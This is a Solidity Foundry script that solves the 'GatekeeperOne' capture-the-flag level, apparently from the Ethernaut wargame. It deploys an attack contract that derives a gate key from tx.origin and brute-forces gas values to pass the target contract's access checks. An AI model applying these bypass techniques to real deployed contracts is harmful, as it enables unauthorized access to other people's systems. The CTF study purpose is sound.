// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;


import "../src/GateKeeperOne.sol";
import "forge-std/Script.sol";
import "forge-std/console.sol";
/*
    Make it past the gatekeeper and register as an entrant to pass this level.

    Solution
        Gate 1: Call the function from a contract
        Gate 2: Specify gas must be % 8191
        Gate 3: Must pass casting
 */

contract GateKeeperAttack {
    GatekeeperOne gatekeeper = GatekeeperOne(0xa779378a76e88294E8D64B06341b6D6077B48fa9);

    // Gate 1 Solution
    constructor() {

        // Gate 3 Solution 1
        // uint16 key16 = uint16(uint160(tx.origin));
        // uint64 key64 = uint64(1 << 63) + uint64(key16);
        // bytes8 gateKey = bytes8(key64);

        // Gate 3 Solution 2
        bytes8 gateKey = bytes8(uint64(uint160(tx.origin))) & 0xFFFFFFFF0000FFFF;

        // Gate 2 Solution: Keep trying to call the function with different amounts of gas specified
        for(uint256 i = 0; i < 120; i++){
          (bool result ,) = address(gatekeeper).call{gas: i + 150 + 8191 * 3}(abi.encodeWithSignature("enter(bytes8)", gateKey));

          if(result){
            break;
            }
        }
    }

}
contract GateKeeperOneSolution is Script {

    function run() external {
        vm.startBroadcast(vm.envUint("PRIVATE_KEY"));
        new GateKeeperAttack();
        vm.stopBroadcast();
    }
}